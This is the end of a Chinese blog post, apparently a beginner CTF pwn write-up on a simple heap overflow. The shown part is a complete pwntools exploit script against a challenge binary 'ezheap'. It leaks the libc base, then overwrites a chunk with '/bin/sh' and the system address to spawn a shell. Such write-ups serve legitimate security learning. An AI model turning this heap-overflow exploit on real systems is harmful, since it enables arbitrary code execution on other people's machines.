+</span><span class=lnt id=hl-6-57><a class=lnlinks href=#hl-6-57>57</a>
+</span><span class=lnt id=hl-6-58><a class=lnlinks href=#hl-6-58>58</a>
+</span><span class=lnt id=hl-6-59><a class=lnlinks href=#hl-6-59>59</a>
+</span><span class=lnt id=hl-6-60><a class=lnlinks href=#hl-6-60>60</a>
+</span><span class=lnt id=hl-6-61><a class=lnlinks href=#hl-6-61>61</a>
+</span><span class=lnt id=hl-6-62><a class=lnlinks href=#hl-6-62>62</a>
+</span><span class=lnt id=hl-6-63><a class=lnlinks href=#hl-6-63>63</a>
+</span><span class=lnt id=hl-6-64><a class=lnlinks href=#hl-6-64>64</a>
+</span><span class=lnt id=hl-6-65><a class=lnlinks href=#hl-6-65>65</a>
+</span><span class=lnt id=hl-6-66><a class=lnlinks href=#hl-6-66>66</a>
+</span><span class=lnt id=hl-6-67><a class=lnlinks href=#hl-6-67>67</a>
+</span><span class=lnt id=hl-6-68><a class=lnlinks href=#hl-6-68>68</a>
+</span><span class=lnt id=hl-6-69><a class=lnlinks href=#hl-6-69>69</a>
+</span><span class=lnt id=hl-6-70><a class=lnlinks href=#hl-6-70>70</a>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>LibcSearcher</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>ctypes</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span> <span class=s2>&#34;debug&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&#34;./libc-2.23.so&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>io</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s2>&#34;./ezheap&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=c1># io = remote(&#39;node1.anna.nssctf.cn&#39;, 28720)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>s</span><span class=p>(</span><span class=n>payload</span><span class=p>:</span> <span class=nb>bytes</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=kc>None</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>sl</span><span class=p>(</span><span class=n>payload</span><span class=p>:</span> <span class=nb>bytes</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=kc>None</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>sa</span><span class=p>(</span><span class=n>message</span><span class=p>:</span> <span class=nb>str</span><span class=p>,</span> <span class=n>payload</span><span class=p>:</span> <span class=nb>bytes</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>bytes</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=n>message</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>sla</span><span class=p>(</span><span class=n>message</span><span class=p>:</span> <span class=nb>str</span><span class=p>,</span> <span class=n>payload</span><span class=p>:</span> <span class=nb>bytes</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>bytes</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=n>message</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>r</span><span class=p>(</span><span class=n>numb</span> <span class=o>=</span> <span class=kc>None</span><span class=p>,</span> <span class=n>timeout</span><span class=p>:</span> <span class=nb>float</span> <span class=o>=</span> <span class=mi>5</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>bytes</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>io</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=n>numb</span><span class=p>,</span> <span class=n>timeout</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>rl</span><span class=p>()</span> <span class=o>-&gt;</span> <span class=nb>bytes</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>ru</span><span class=p>(</span><span class=n>message</span><span class=p>,</span> <span class=n>drop</span><span class=p>:</span> <span class=nb>bool</span> <span class=o>=</span> <span class=kc>False</span><span class=p>,</span> <span class=n>timeout</span><span class=p>:</span> <span class=nb>float</span> <span class=o>=</span> <span class=mi>5</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>bytes</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=n>message</span><span class=p>,</span> <span class=n>drop</span><span class=o>=</span><span class=n>drop</span><span class=p>,</span> <span class=n>timeout</span><span class=o>=</span><span class=n>timeout</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>i</span><span class=p>()</span> <span class=o>-&gt;</span> <span class=kc>None</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>add</span><span class=p>(</span><span class=n>index</span><span class=p>,</span> <span class=n>size</span><span class=p>,</span> <span class=n>name</span><span class=p>,</span> <span class=n>content</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s2>&#34;Choice:&#34;</span><span class=p>,</span> <span class=s2>&#34;1&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s2>&#34;Input your idx:&#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>index</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s2>&#34;Size:&#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>size</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s2>&#34;Name:&#34;</span><span class=p>,</span> <span class=n>name</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s2>&#34;Content:&#34;</span><span class=p>,</span> <span class=n>content</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>delete</span><span class=p>(</span><span class=n>index</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s2>&#34;Choice:&#34;</span><span class=p>,</span> <span class=s2>&#34;2&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s2>&#34;Input your idx:&#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>index</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>show</span><span class=p>(</span><span class=n>index</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s2>&#34;Choice:&#34;</span><span class=p>,</span> <span class=s2>&#34;3&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s2>&#34;Input your idx:&#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>index</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>edit</span><span class=p>(</span><span class=n>index</span><span class=p>,</span> <span class=n>size</span><span class=p>,</span> <span class=n>content</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s2>&#34;Choice:&#34;</span><span class=p>,</span> <span class=s2>&#34;4&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s2>&#34;Input your idx:&#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>index</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s2>&#34;Size:&#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>size</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=n>s</span><span class=p>(</span><span class=n>content</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># leak libc_base</span>
+</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x10</span><span class=p>,</span> <span class=s2>&#34;A&#34;</span><span class=p>,</span> <span class=s2>&#34;A&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mh>0x10</span><span class=p>,</span> <span class=s2>&#34;B&#34;</span><span class=p>,</span> <span class=s2>&#34;B&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=o>*</span><span class=mh>0x18</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x31</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=o>*</span><span class=mh>0x10</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x80</span><span class=s1>&#39;</span>
+</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x31</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>show</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>libc_base</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>ru</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x7f</span><span class=s2>&#34;</span><span class=p>)[</span><span class=o>-</span><span class=mi>6</span><span class=p>:]</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>))</span> <span class=o>-</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s2>&#34;puts&#34;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s2>&#34;libc_base: &#34;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>libc_base</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=c1># get shell</span>
+</span></span><span class=line><span class=cl><span class=n>system</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s2>&#34;system&#34;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=mi>3</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x31</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=mi>2</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>system</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x48</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>show</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>i</span><span class=p>()</span></span></span></code></pre></td></tr></table></div></div></div><footer class=post-footer><div class=post-tags><a href=/tags/ctf/>Ctf
+</a><a href=/tags/pwn/>Pwn</a></div><div class=post-share-tools><div class=post-share-loading><i class="fa-solid fa-ellipsis fa-spin"></i></div><div class="a2a_kit a2a_kit_size_32 a2a_default_style"><a class=a2a_dd href=https://www.addtoany.com/share></a><a class=a2a_button_wechat></a><a class=a2a_button_qzone></a><a class=a2a_button_sina_weibo></a><a class=a2a_button_douban></a><a class=a2a_button_facebook></a><a class=a2a_button_x></a><a class=a2a_button_email></a><a class=a2a_button_printfriendly></a></div></div><hr><div class=reward-container><div><i class="fa-solid fa-mug-hot"></i>请我喝杯咖啡吧 ヾ(^▽^*)))</div><button>
+赞赏</button><div class=post-reward><div class=post-reward-item><img src=/imgs/img-lazy-loading.gif data-src=/imgs/ali-pay.jpg alt="lhon901 - 支付宝">
+<span>支付宝</span></div><div class=post-reward-item><img src=/imgs/img-lazy-loading.gif data-src=/imgs/wechat-pay.jpg alt="lhon901 - 微信">
+<span>微信</span></div></div></div><div class=post-copyright><img src=/imgs/cc/cc.svg class=cc-icon width=75 height=75 align=right alt=共享知识 title=共享知识><ul><li class=post-copyright-title><strong>文章标题：</strong>
+从零开始的 Pwn 之旅 - 简单的堆溢出</li><li class=post-copyright-author><strong>本文作者： </strong>lhon901</li><li class=post-copyright-link><strong>本文链接：</strong>
+<a id=post-cr-link href=/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---%E7%AE%80%E5%8D%95%E7%9A%84%E5%A0%86%E6%BA%A2%E5%87%BA/ title="从零开始的 Pwn 之旅 - 简单的堆溢出">/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---%E7%AE%80%E5%8D%95%E7%9A%84%E5%A0%86%E6%BA%A2%E5%87%BA/</a></li><li class=post-copyright-license><strong>版权声明： </strong>本作品采用 <i class="fab fa-fw fa-creative-commons"></i><a target=_blank href=https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-hans>BY-NC-SA</a> 许可协议。转载请注明出处！</li><li><div class=license-icons><a href=https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-hans target=_blank><img src=/imgs/cc/big/by_nc_sa.svg alt=BY-NC-SA title=BY-NC-SA>
+</a><a href=https://notbyai.fyi target=_blank><img src=/imgs/notbyai/zh-hans/.svg title="Not By AI"></a></div></li></ul></div><div class=followme><span>欢迎关注我的其它发布渠道</span><div class=social-list><div class=social-item><a target=_blank class=social-link href=/images/wechat_channel.jpg><span class=icon><i class="fab fa-weixin"></i>
+</span><span class=label>WeChat</span></a></div><div class=social-item><a target=_blank class=social-link href=/atom.xml><span class=icon><i class="fa fa-rss"></i>
+</span><span class=label>RSS</span></a></div></div></div><div class=post-nav><div class="post-nav-next post-nav-item"></div><div class="post-nav-prev post-nav-item"><a href=/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---heap-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3/ rel=prev title="从零开始的 Pwn 之旅 - Heap 深入理解">从零开始的 Pwn 之旅 - Heap 深入理解
+<i class="fa fa-chevron-right"></i></a></div></div></footer></article></div></div></main><footer class=footer><div class=footer-inner><div id=i18n-translate class=i18n-translate><i class="fa fa-language"></i><div id=lang-select class=lang-select><div id=lang-selected class=selected-option><span class="flag-icon flag-icon-zh-cn"></span>
+<span class=selected-language>简体中文</span>
+<i class="fa fa-chevron-down"></i></div><div id=lang-options class=lang-options><div class=lang-option lang-code=zh-cn lang-name=简体中文 lang-url=/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---%E7%AE%80%E5%8D%95%E7%9A%84%E5%A0%86%E6%BA%A2%E5%87%BA/><span class="flag-icon flag-icon-zh-cn"></span>
+<span class=lang-name>简体中文</span></div></div></div></div><div class=copyright>&copy;
+<span itemprop=copyrightYear>2025
+</span><span class=with-love><i class="fa fa-heart"></i>
+</span><span class=author itemprop=copyrightHolder>© 2024 lhon901. All rights reserved.</span></div><div class=powered-by>由 <a href=https://gohugo.io title=0.146.0 target=_blank>Hugo</a> & <a href=https://github.com/hugo-next/hugo-theme-next title=4.8.3 target=_blank>Hugo NexT.Gemini</a> 强力驱动</div></div></footer><script class=next-config data-name=page type=application/json>{"clipboard":{"js":{"alias":"clipboard","file":"dist/clipboard.min.js","name":"clipboard.js","version":"2.0.11"}},"comments":false,"expired":false,"isHome":false,"isPage":true,"path":"%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---%E7%AE%80%E5%8D%95%E7%9A%84%E5%A0%86%E6%BA%A2%E5%87%BA","permalink":"/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---%E7%AE%80%E5%8D%95%E7%9A%84%E5%A0%86%E6%BA%A2%E5%87%BA/","title":"从零开始的 Pwn 之旅 - 简单的堆溢出","toc":true,"waline":{"commentcnt":{"alias":"@waline/client","alias_name":"waline","file":"dist/comment.js","name":"comment","version":"2.15.8"}}}</script><script type=text/javascript src=/js/3rd/animejs/3.2.2/anime.min.js crossorigin=anonymous defer></script><script type=text/javascript src=/js/3rd/viewerjs/1.11.6/viewer.min.js crossorigin=anonymous defer></script><script class=next-config data-name=main type=application/json>{"bookmark":{"color":"#222","enable":true,"save":"manual"},"copybtn":true,"darkmode":false,"giscus":{"cfg":{"category":"Comments","categoryid":null,"emit":false,"inputposition":"top","mapping":"title","reactions":false,"repo":"username/repo-name","repoid":null,"theme":"preferred_color_scheme"},"js":"https://giscus.app/client.js"},"hostname":"/","i18n":{"ds_day":" 天前","ds_days":" 天 ","ds_hour":" 小时前","ds_hours":" 小时 ","ds_just":"刚刚","ds_min":" 分钟前","ds_mins":" 分钟","ds_month":" 个月前","ds_years":" 年 ","empty":"没有找到任何搜索结果：${query}","hits":"找到 ${hits} 个搜索结果","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","placeholder":"搜索..."},"isMultiLang":true,"lang":"zh-CN","lazyload":false,"localSearch":{"enable":true,"limit":1e3,"path":"/searchindexes.xml","preload":false,"topnperarticle":-1,"trigger":"auto","unescape":false},"motion":{"async":true,"enable":true,"transition":{"collheader":"slideInRight","postblock":"fadeIn","postbody":"fadeInDown","postheader":"fadeInDown","sidebar":"fadeInUp"}},"postmeta":{"comments":{"enable":true,"plugin":"waline"},"views":{"enable":true,"plugin":"busuanzi"}},"root":"/","scheme":"Gemini","share":{"addtoany":{"js":"https://static.addtoany.com/menu/page.js","locale":"zh-CN","num":8},"enable":true},"sidebar":{"display":"post","offset":12,"padding":18,"position":"left","width":256},"vendor":{"plugins":"local","router":{"name":"local","type":"modern","url":"/js/3rd"}},"version":"4.8.3","waline":{"cfg":{"emoji":false,"imguploader":false,"placeholder":"请文明发言哟 ヾ(≧▽≦*)o","reaction":true,"reactiontext":["点赞","踩一下","得意","不屑","尴尬","睡觉"],"reactiontitle":"你认为这篇文章怎么样？","requiredmeta":["nick","mail"],"serverurl":null,"sofa":"快来发表你的意见吧 (≧∀≦)ゞ","wordlimit":200},"css":{"alias":"@waline/client","file":"dist/waline.css","name":"waline","version":"2.15.8"},"js":{"alias":"@waline/client","file":"dist/waline.js","name":"waline","version":"2.15.8"}}}</script><script type=text/javascript src="/js/main.min.js?=1755317041" defer></script><script type=text/javascript src="/js/clipboard.min.js?=1755317041" defer></script></body></html>
